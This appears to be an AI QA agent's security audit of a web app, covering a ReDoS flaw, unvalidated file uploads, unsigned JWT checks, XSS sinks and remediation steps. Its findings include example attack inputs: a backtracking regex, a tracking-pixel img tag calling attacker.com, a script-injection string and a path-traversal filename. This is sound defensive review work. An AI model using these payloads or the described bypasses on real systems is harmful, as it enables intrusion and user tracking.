# Security Audit: Data Layer, Input Validation, and Output Encoding

**Date**: 2026-03-23
**Reviewer**: Centinela (QA Agent)
**Scope**: src/pages/api/, src/middleware/, src/lib/validation/sanitization.ts, src/components/ (file uploads and forms), functions/src/parse-linkedin-pdf.ts

---

## Summary

The data layer shows meaningful security improvements since prior audits: the SSRF in `fetch-logo.ts` has been fixed with a domain allowlist regex, stored XSS sites now wrap `dangerouslySetInnerHTML` in `sanitizeHtml()`, and the new `parseLinkedInPdf` Cloud Function has authentication, size validation, magic-byte checks, and per-user rate limiting. However, six new or persisting issues require attention: (1) `sanitizeFilename()` contains a bug that truncates to a single character instead of preserving the extension, (2) `highlightText()` in ForumSearch passes user-controlled search terms directly into `new RegExp(...)` — a ReDoS/injection vector — before sanitization, (3) resource file upload has NO server-side file type or size enforcement (client `accept=` is trivially bypassed), (4) `verifyRequest()` decodes JWT without signature verification, (5) three previously known unresolved critical/high debt items remain open (TD-017, TD-019, TD-025), and (6) the functions/ workspace has 15 CVEs including 6 high-severity.

---

## Findings

### Critical (must fix before merge)

- **[C-1] ReDoS + HTML injection in `highlightText()` — ForumSearch.tsx:182**
  - File: `src/components/forums/ForumSearch.tsx:182`
  - Description: `new RegExp(`(${highlight})`, 'gi')` constructs a regex from user-controlled search terms (each entry in `result.highlights`). A crafted string like `(((((a+)+)+)+)+)$`causes catastrophic backtracking in the browser. Additionally,`highlight`is not escaped for regex special characters, so`[`or`.`in a search term throws`SyntaxError`and crashes the component. The result is passed to`sanitizeHtml()` only AFTER regex construction, which does not prevent the ReDoS.
  - Impact: Browser tab freeze/OOM for other users viewing forum search results containing adversarially-crafted search terms stored in Firestore; uncaught exceptions crash the component.
  - Fix: (a) Escape the highlight term before creating the regex: `highlight.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')`. (b) Add a length guard (`highlight.length <= 100`) before constructing the regex. Sanitize `highlight` strings via `sanitizeText()` before inserting into the DOM or regex.

- **[C-2] No server-side file type or size validation in resource upload**
  - File: `src/lib/resources.ts:212-219` (uploadResource), `src/components/resources/ResourceUpload.tsx:484` (accept attribute)
  - Description: `uploadResource()` calls `uploadBytes(fileRef, request.file)` directly without checking `request.file.type`, `request.file.size`, or the file extension server-side. The browser `accept=` attribute is easily bypassed (curl, DevTools, or any HTTP client). An authenticated member can upload an `.html`, `.svg`, `.js`, or `.php` file — or an arbitrarily large file — to Firebase Storage under `resources/`.
  - Impact: (a) XSS: `.html`/`.svg` files served from Firebase Storage with public URLs can execute scripts in the browser when a victim opens the link. (b) Denial of Service: no size limit prevents uploading multi-GB files and exhausting Firebase Storage quota. (c) Drive-by download: `.exe` or `.apk` files can be weaponized.
  - Fix: In `uploadResource()` before `uploadBytes`: (a) whitelist allowed MIME types (`application/pdf`, `text/csv`, `application/vnd.ms-excel`, etc.) and reject unknown types; (b) enforce a max file size (e.g., 50MB for main file, 5MB for thumbnail); (c) validate file extension matches declared type. For images, reject MIME types that are not `image/jpeg`, `image/png`, or `image/gif`. Firebase Storage Rules should also enforce this as a second layer (`request.resource.contentType.matches('image/.*')`).

- **[C-3] `sanitizeFilename()` truncation bug produces single-character extension**
  - File: `src/lib/validation/sanitization.ts:222-223`
  - Description:
    ```typescript
    const ext = sanitized.split('').pop() || ''; // splits into individual characters, pops last CHARACTER
    const name = sanitized.substring(0, maxLength - ext.length - 1);
    sanitized = `${name}.${ext}`; // produces "name.e" instead of "name.txt"
    ```
    `String.split('')` splits into individual characters. So `"longname.txt"` produces `ext = "t"`, `name` is truncated, and the reconstructed filename is `"longnam.t"`. The correct call is `sanitized.split('.').pop()` to extract the file extension.
  - Impact: Uploaded files whose names exceed 255 characters will have their extension corrupted (e.g., `.j` instead of `.jpg`). This can cause content-type detection failures, broken downloads, and bypass of any extension-based validation built on top of `sanitizeFilename`.
  - Fix: Change `sanitized.split('').pop()` to `sanitized.split('.').pop() || ''`. Test with filenames exceeding 255 chars.

### Warning (should fix)

- **[W-1] `verifyRequest()` decodes JWT without signature verification**
  - File: `src/lib/auth/verify-request.ts:17-48`
  - Description: The fallback path in `verifyRequest()` calls `decodeAndValidateToken()`, which base64-decodes the JWT payload and checks `sub`, `exp`, and `iss` claims — but never verifies the cryptographic signature. Any attacker who can construct a valid-looking JWT payload (without signing it) and encodes it as base64 can produce a token that passes this check. The function is defence-in-depth (middleware session validation runs first), but if `securityManager` is null (known silent bypass, see memory) or if the session cookie is absent, this fallback becomes the only gate and it is bypassable.
  - Impact: Auth bypass on all payment and company API endpoints if session middleware is skipped (securityManager init failure, known risk TD-018).
  - Fix: Use Firebase Admin SDK `adminAuth.verifyIdToken(token)` in the fallback path. If Admin SDK is unavailable in the Astro edge runtime, use a `fetch` against `https://www.googleapis.com/robot/v1/metadata/x509/securetoken@system.gserviceaccount.com` to verify RSA signature. At minimum, document clearly that this path is NOT cryptographically safe and disable the Bearer fallback until it is.

- **[W-2] Profile photo upload accepts any MIME type from any authenticated user**
  - File: `src/lib/members/mutations.ts:278`
  - Description: `uploadProfileImage(uid, file)` calls `uploadBytes(fileRef, file)` on a fixed path `profiles/${uid}/avatar.jpg` without checking `file.type` or `file.size`. A user can upload an SVG with embedded JavaScript, which will be served from Firebase Storage with a `.jpg` filename but the content of an SVG.
  - Impact: XSS via image if the browser renders the served content as SVG. Lower risk if Firebase Storage serves images with forced `Content-Disposition: attachment`, but this is not confirmed.
  - Fix: Validate `file.type` is `image/jpeg`, `image/png`, or `image/gif` before upload. Add a max size (e.g., 5MB). Firebase Storage Rules should also enforce `request.resource.contentType.matches('image/.*')`.

- **[W-3] `sanitizeHtml()` allows `<img>` with any `src` — potential for tracking pixels and SSRF**
  - File: `src/lib/validation/sanitization.ts:14-43`
  - Description: `SanitizationConfig.allowedTags` includes `'img'` and `allowedAttributes.img` includes `'src'`. DOMPurify is configured with `ALLOWED_URI_REGEXP` that permits `http:` and `https:` URLs. This means a forum post can embed `<img src="https://attacker.com/track?uid=...">` — a classic tracking pixel. Additionally, the `<a>` tag allows `target` (via `ADD_ATTR: ['target']`) without enforcing `rel="noopener noreferrer"`, which permits tabnapping attacks.
  - Impact: User tracking without consent; tabnapping via `<a target="_blank">` without `rel="noopener"`.
  - Fix: (a) Remove `img` from `allowedTags` for user-generated forum content (use a `noImage: true` option). (b) If images are needed, restrict `src` to a single trusted CDN domain via a custom `ALLOWED_URI_REGEXP`. (c) Force `rel="noopener noreferrer"` on all `<a>` tags via DOMPurify's `ADD_ATTR` or a post-processing pass.

- **[W-4] `set:html` with user-controlled structured data in SEOHead.astro**
  - File: `src/components/seo/SEOHead.astro:309`
  - Description: `<script type="application/ld+json" set:html={JSON.stringify(data)} />` where `data` is built from props including `jobPosting`, `event`, `organization`, and `breadcrumbs` — all of which accept `any` from callers. If any caller passes unsanitized user-controlled content into these props (e.g., a job posting title containing `</script><script>alert(1)</script>`), `JSON.stringify` is not a complete XSS defense: the string `"</script>"` serializes to `"</script>"` in JSON, which a browser JSON-LD parser may still interpret as closing the script tag.
  - Impact: XSS via JSON-LD injection if user-controlled content reaches the `structuredData` prop. Currently only static data is passed, but future callers may not be safe.
  - Fix: Use `JSON.stringify(data).replace(/<\/script>/gi, '<\\/script>')` to escape closing script tags in the JSON-LD payload, which is the standard mitigation. Apply the same fix in `ModernLayout.astro:124`.

- **[W-5] Error messages in payment APIs leak Stripe/Firestore internal details**
  - File: `src/pages/api/create-subscription.ts:92`, `src/pages/api/create-invoice.ts:232`, `src/pages/api/create-payment-intent.ts:106`
  - Description: All three payment endpoints return `error instanceof Error ? error.message : ...` verbatim to the caller. Stripe SDK errors include internal customer IDs, plan IDs, and Stripe API error codes. Firestore errors include collection paths and document IDs.
  - Impact: Information disclosure aids attacker reconnaissance of internal data structures. Known as TD-024; not resolved.
  - Fix: Log the full error server-side with a correlation ID; return only a generic message plus the correlation ID to the caller: `{ error: 'Payment processing failed', correlationId: crypto.randomUUID() }`.

- **[W-6] `stripe-webhook.ts` GET handler returns 200 with no authentication**
  - File: `src/pages/api/stripe-webhook.ts:116-130`
  - Description: `export const GET` returns `{ status: 'ok', message: 'Stripe webhook endpoint is active', timestamp: ... }` with status 200 and no authentication check. This is a health check, but it confirms the webhook URL to anyone who probes it, reducing obscurity.
  - Impact: Low severity; reveals that a Stripe webhook endpoint exists at this path.
  - Fix: Either remove the GET handler or return 405 Method Not Allowed (consistent with other endpoints in the file).

### Suggestion (consider)

- **[S-1] CORS middleware uses default fallback to `https://secid.mx` instead of rejecting unknown origins**
  - File: `src/middleware/index.ts:77-79`
  - Description: `const corsOrigin = allowedOrigins.includes(requestOrigin) ? requestOrigin : 'https://secid.mx'`. Requests from unrecognized origins receive `Access-Control-Allow-Origin: https://secid.mx` (a valid CORS origin), which means the browser will still enforce the origin restriction correctly. However, this is confusing: it appears to "allow" requests from any origin by silently overriding the reflected value.
  - This is technically correct CORS behavior (the browser still blocks cross-origin reads if the origin doesn't match), but the code does not include `localhost:*` for development — this may be intentional.
  - Fix: No security change needed. Add a comment explaining the intent. Consider adding `http://localhost:4321` for development parity.

- **[S-2] `companies/index.ts` domain field has no format validation**
  - File: `src/pages/api/companies/index.ts:96-103`
  - Description: The domain field in the company creation endpoint only checks that it is a non-empty string. There is no regex to verify it is a valid domain. Compare with `fetch-logo.ts` which has `isValidDomain()` with full regex validation.
  - Fix: Reuse the `isValidDomain()` function from `fetch-logo.ts` (or extract it to a shared utility) and apply it to the company creation endpoint's domain field.

- **[S-3] `functions/src/parse-linkedin-pdf.ts` rate limit has a TOCTOU window**
  - File: `functions/src/parse-linkedin-pdf.ts:52-69`
  - Description: The rate limiting logic reads the rate doc, checks against limit, then writes the updated timestamps — two separate Firestore operations not in a transaction. A user who sends 10 concurrent requests simultaneously could bypass the per-hour limit, as all 10 reads may see the same initial state.
  - Fix: Wrap the read + check + write in a Firestore transaction, or use `FieldValue.increment()` for atomic counting.

---

## Input Validation Audit

### API Endpoints (src/pages/api/)

| Endpoint                        | Auth                                | Input Validated                                                            | Notes                                             |
| ------------------------------- | ----------------------------------- | -------------------------------------------------------------------------- | ------------------------------------------------- |
| POST /api/create-payment-intent | verifyRequest (no sig verification) | planId validated against SUBSCRIPTION_PLANS                                | Amount derived server-side — GOOD                 |
| POST /api/create-subscription   | verifyRequest                       | planId validated; customerData not sanitized                               | Email format not validated                        |
| POST /api/create-invoice        | verifyRequest                       | RFC validated via validateRFC(); amount checked                            | Items array quantities/amounts not bounds-checked |
| GET /api/create-invoice         | verifyRequest                       | invoiceId from query param — passed directly to stripe.invoices.retrieve() | Stripe SDK handles validation                     |
| POST /api/companies/index       | verifyRequest                       | name, domain, optional fields validated                                    | Domain format NOT validated (S-2)                 |
| POST /api/companies/fetch-logo  | verifyRequest + isAdmin()           | SSRF FIXED — isValidDomain() added                                         | IMPROVEMENT since last audit                      |
| POST /api/stripe-webhook        | Stripe signature                    | Verified via verifyWebhookSignature + validateWebhookEvent                 | GOOD                                              |
| GET /api/stripe-webhook         | None                                | N/A                                                                        | Returns 200 — see W-6                             |

### Firestore Query Safety (NoSQL Injection)

The Firebase JavaScript SDK uses structural query builders (`where()`, `orderBy()`, etc.) — not string interpolation. There are no NoSQL injection vectors in the query construction. User-supplied values are passed as typed parameters to `where('field', '==', value)`, which the SDK serializes to protobuf — not to a query string. **This area is clean.**

### React Form Validation

- `ResourceUpload.tsx`: client-side `validateForm()` checks title, description, summary, and file presence. No XSS sanitization applied to form fields before Firestore write. File type enforcement is `accept=` only — server-side enforcement is absent (C-2).
- `LinkedInImportModal.tsx`: 5MB size check on PDF. File type is enforced via `accept="application/pdf"` only — no magic-byte check in the browser path. The Cloud Function adds magic-byte validation (GOOD).
- Profile photo (`PersonalTab.tsx`): `accept="image/*"` only — no server-side validation (W-2).

---

## Output Encoding Deep Dive

### `sanitizeHtml()` — Status: IMPROVED, residual risks remain

The function uses `isomorphic-dompurify` with `FORBID_ATTR: ['style', 'onclick', 'onerror', 'onload']` and `ALLOWED_URI_REGEXP`. This is a solid baseline. Residual issues:

1. `<img src>` allows any HTTPS URL — tracking pixels (W-3).
2. `<a>` tags lack `rel="noopener"` enforcement (W-3).
3. `ALLOWED_ATTR` is flattened via `Object.values(allowedAttributes).flat()` — this means ALL listed attributes are allowed on ALL tags, not just the ones specified per-tag. For example, `cite` (intended for `blockquote`) is also allowed on `a` elements. Low risk but imprecise.

### `set:html` audit

| File                               | Line | Data Source                                                                                               | Risk                                                                         |
| ---------------------------------- | ---- | --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| `src/components/seo/SEOHead.astro` | 309  | `JSON.stringify(data)` from props: `jobPosting`, `event`, `organization`, `breadcrumbs`, `structuredData` | Props accept `any`; caller-controlled data not escaped for `</script>` (W-4) |
| `src/layouts/ModernLayout.astro`   | 124  | `JSON.stringify(schemaOrgJson)` from hardcoded static object                                              | Static only — safe                                                           |

**Assessment**: `ModernLayout.astro` is safe (static org data only). `SEOHead.astro` is a latent risk — currently only called with static data, but future callers passing user-controlled content (e.g., job posting titles) would be vulnerable.

### `dangerouslySetInnerHTML` audit

| File                  | Line          | Sanitized?                                                | Notes                                                                                                                                                                                |
| --------------------- | ------------- | --------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `ForumPost.tsx`       | 543           | YES — `sanitizeHtml(processContent(content))`             | Fixed from prior audit                                                                                                                                                               |
| `ForumSearch.tsx`     | 566, 577, 632 | YES — `sanitizeHtml(highlightText(...))`                  | `highlightText()` itself is a ReDoS vector (C-1)                                                                                                                                     |
| `BlogPost.tsx`        | 174           | YES — `sanitizeHtml(post.content)`                        | Fixed from prior audit                                                                                                                                                               |
| `NewsletterView.tsx`  | 108           | YES — `sanitizeHtml(newsletter.content)`                  | Fixed from prior audit                                                                                                                                                               |
| `SpotlightDetail.tsx` | 154           | YES — `sanitizeHtml(spotlight.story)`                     | Fixed from prior audit                                                                                                                                                               |
| `HelpCenter.tsx`      | 389           | YES — `sanitizeHtml(article.content.replace(...))`        | `.replace(/#{1,6}\s/g, '<h3>')` runs BEFORE sanitization — a Markdown-like transformation that could introduce tags. Not a critical risk with current regex, but should be reviewed. |
| `CourseDetail.tsx`    | 610           | YES — `sanitizeHtml(selectedLesson.content.text.content)` | Fixed from prior audit                                                                                                                                                               |
| `BlogEditor.tsx`      | 344           | YES — `sanitizeHtml(content)`                             | Preview only, not persisted without sanitization                                                                                                                                     |

**Assessment**: The prior critical XSS findings (TD-019) are now mitigated by `sanitizeHtml()` wrapping at all `dangerouslySetInnerHTML` sites. The ReDoS in `highlightText()` (C-1) is a new finding introduced with the search feature.

---

## File Upload Security

### Three upload paths exist:

1. **Profile image** (`src/lib/members/mutations.ts:278`): Fixed path `profiles/{uid}/avatar.jpg`. No server-side MIME/size check (W-2).
2. **Resource files** (`src/lib/resources.ts:214-248`): Arbitrary types accepted, no server-side validation (C-2). Path is `resources/{timestamp}_{filename}` — timestamp prevents path traversal but filename is unsanitized (also affected by C-3 if `sanitizeFilename` were called, which it is NOT).
3. **Company logo** (`src/pages/api/companies/fetch-logo.ts`): Fetched from external URL, not user-uploaded. Domain now validated. Content-type from response is passed through to Firebase Storage (`{ contentType }`) — if the external server lies about content-type, an SVG or HTML could be stored as `image/png`. Low risk but worth noting.
4. **LinkedIn PDF** (`functions/src/parse-linkedin-pdf.ts`): Cloud Function receives base64, validates magic bytes and size. No direct file path write — text extraction only. GOOD.

### Can users upload .html, .svg, or .js files?

- Resource upload: **YES** — the `accept=` attribute in the browser blocks it in UI, but the upload function does not enforce it server-side.
- Profile image: **YES** — `accept="image/*"` is UI-only.

### Is there path traversal?

- Resource path: `resources/${Date.now()}_${request.file.name}` — if filename contains `/`, it creates nested paths. `sanitizeFilename()` strips `/` and `\` but is **not called** before upload in `uploadResource()`. A filename `../../etc/passwd.jpg` (after stripping slashes → `..etc/passwd.jpg`) would create an unintended path segment.
- Fix: Call `sanitizeFilename(request.file.name)` before constructing the Firebase Storage path in `uploadResource()`.

---

## Data Exposure

### API Response Field Leakage

- **Payment endpoints**: Return Stripe subscription/invoice objects with `customer`, `hosted_invoice_url`, `invoice_pdf` — these are Stripe opaque IDs and URLs, appropriate to return to the authenticated caller.
- **Company creation** (`/api/companies/index.ts`): Returns only `{ companyId }` — minimal, good.
- **Invoice GET**: Returns `invoice.customer` (a Stripe customer ID string). This is the caller's own customer ID — acceptable.
- **Salary stats CF**: Previously flagged TD-025 (moderators receive raw PII). Not resolved.

### Error Response Leakage

All three payment endpoints return `error.message` verbatim — known as TD-024, not resolved. Stripe error messages include `"No such customer: 'cus_XXXX'"`, `"Invalid API Key provided"`, etc.

### User Profile Exposure

- `getUserBookmarks()` in `resources.ts` takes a `userId` parameter with no auth check — any caller who knows a UID can retrieve their bookmarks by calling this function directly from client code.
- The Firestore security rules are the backstop here; this is not a server-side API endpoint.

### Firestore Query Scoping

- `getRecentCreationCount()` in `companies/index.ts:61-72`: Scoped to `where('createdBy', '==', userId)` — correct.
- `searchResources()` in `resources.ts:126`: Always adds `where('status', '==', 'approved')` — resources in `pending` status are not returned in search. GOOD.
- `conversationsRef` query uses `where('participants', '==', participants)` where `participants` is a sorted array of UIDs. Firestore array equality requires exact match — a user cannot read another user's conversations by crafting a different array ordering. GOOD.

---

## Rate Limiting Assessment

| Endpoint / Action              | Rate Limited?                                     | How                                                                                       |
| ------------------------------ | ------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| All `/api/*` endpoints         | YES                                               | `rateLimitingMiddleware` — IP-based via `securityManager.config.rateLimiting.presets.api` |
| Auth endpoints (`/api/auth/`)  | YES                                               | CAPTCHA middleware + rate limiting                                                        |
| `/api/companies/` POST         | YES — secondary                                   | Application-level: 5 creations per 24h per user (Firestore query)                         |
| `parseLinkedInPdf` CF          | YES                                               | Per-user Firestore timestamps: 5/hour                                                     |
| Payment APIs (`/api/create-*`) | YES via `/api/create-` prefix matching middleware | IP-based only; no per-user payment rate limit                                             |
| `getSalaryStats` CF            | NO                                                | Firebase callable — auth enforced but no rate limit                                       |
| `stripe-webhook.ts` GET        | NO                                                | No auth, no rate limit (public health endpoint)                                           |

**Bypass risk**: The IP-based rate limiter reads from `x-forwarded-for` header (`getClientId: (request) => request.headers.get('x-forwarded-for') || 'unknown'`). On Firebase Hosting, `x-forwarded-for` is populated by Google's CDN and cannot be spoofed by the client. On self-hosted infrastructure this would be bypassable. Current deployment (Firebase Hosting) is safe.

**securityManager null bypass**: If `securityManager` fails to initialize, rate limiting and session validation middleware are both skipped. The `captchaValidationMiddleware` also checks `!securityManager` and returns early. Known risk — TD-018 context. The `verifyRequest()` fallback in endpoints provides a partial backstop (with the JWT signature weakness noted in W-1).

---

## CORS Configuration Assessment

- Allowed origins: `['https://secid.mx', 'https://beta.secid.mx']` — restrictive and correct for production.
- No wildcard (`*`) origin.
- No credentials with wildcard (no vulnerability here).
- `Vary: Origin` header set — correct; prevents CDN caching collisions.
- Preflight handled with 204.
- `Access-Control-Allow-Credentials` is NOT set — this means cookies/session tokens are not included in cross-origin requests. The auth model uses Bearer tokens, so this is expected.
- **Assessment: CORS is properly configured.**

---

## `set:html` Full Audit

Both occurrences are in `<script type="application/ld+json">` blocks:

1. `ModernLayout.astro:124` — hardcoded static org data. SAFE.
2. `SEOHead.astro:309` — built from props that accept `any`, including `jobPosting.description` and similar fields. Latent risk (W-4). Not currently called with user-generated content.

No `set:html` on non-script elements was found. No user-controlled HTML is rendered raw via Astro's `set:html`.

---

## Dead Code Scan (Limited — focused on new changes)

- `functions/lib/index.js` and `functions/lib/index.js.map` are compiled outputs tracked in git — these are generated artifacts and should be in `.gitignore`. They do not introduce security risk but add noise.
- `sanitizeFilename()` is defined but NOT called before the resource upload path in `uploadResource()`. This makes it dead defensive code for the resource upload use case.

---

## Architecture Compliance

- API endpoints correctly use `verifyRequest()` + middleware defense-in-depth layering.
- Firebase callable Cloud Functions (`parseLinkedInPdf`, `getSalaryStats`) validate `request.auth` natively — correct and independent of session store.
- Resource upload logic is client-side Firebase SDK (`uploadBytes` directly from browser) — this means Firebase Storage Rules are the ONLY server-side enforcement for file validation. The Storage Rules should be the subject of the next audit cycle.

---

## TIME OUT — Security Verification (DO-CONFIRM)

- [x] No hardcoded secrets in new code — no new hardcoded secrets found in `parse-linkedin-pdf.ts` or `LinkedInImportModal.tsx`
- [ ] **FAIL** — all user input validated: resource file type/size not validated server-side (C-2); `highlightText` regex injection (C-1); `sanitizeFilename` bug (C-3)
- [x] Database queries parameterized — Firebase SDK structural queries; no string interpolation
- [x] Authentication enforced on all protected endpoints — `verifyRequest()` present; note W-1 (no sig verification)
- [ ] **FAIL** — Dependencies: 10 HIGH CVEs in root (h3 path traversal, flatted, minimatch, svgo, astro-compress, @typescript-eslint), 15 CVEs in functions/ (6 high: @typescript-eslint). No critical CVEs in production runtime dependencies, but h3 path traversal (GHSA-wr4h-v87w-p3r7) is high severity.

---

## Verdict

**CHANGES REQUIRED**

### Required before next release:

1. **C-1** Fix `highlightText()` ReDoS in ForumSearch.tsx — escape regex special chars, add length guard
2. **C-2** Add server-side file type and size validation in `uploadResource()` — whitelist MIME types, enforce max size
3. **C-3** Fix `sanitizeFilename()` extension extraction bug (`split('')` → `split('.')`)
4. Also invoke `sanitizeFilename()` on `request.file.name` before constructing the Firebase Storage path in `uploadResource()`

### Previously required, still open:

- **TD-017**: Hardcoded emergency admin password — delete the script block
- **TD-019**: LinkedIn OAuth CSRF nonce + open redirect
- **TD-025**: Moderators receiving raw PII salary data

---

## Handoff to Forja

**Review location**: `docs/reviews/security-audit-datalayer-2026-03-23.md`
**Verdict**: CHANGES REQUIRED

**Critical count**: 3 (new)
**Warning count**: 6
**Suggestion count**: 3

**Priority fix order**:

1. `src/components/forums/ForumSearch.tsx:182` — escape regex input in `highlightText()` before `new RegExp(...)`
2. `src/lib/validation/sanitization.ts:222` — fix `split('').pop()` → `split('.').pop()`; then call `sanitizeFilename()` in `src/lib/resources.ts:214` before path construction
3. `src/lib/resources.ts:218` — add MIME type allowlist and size limit before `uploadBytes()` call

**Pattern of concern**: File upload paths lack server-side enforcement as a pattern across the codebase (profile image, resource upload). Firebase Storage Rules need an audit as the backstop for these paths.

**Open questions for Dev**:

- Is `src/lib/members/mutations.ts:278` `uploadProfileImage()` ever called from a server-side context? If not, Firebase Storage Rules are the only gate.
- Were Firebase Storage Rules updated when the resource upload path was added? The existing rules audit noted `forums/{forumId}` had no size/content-type restriction (W-4 from previous audit). Resource paths may have the same gap.
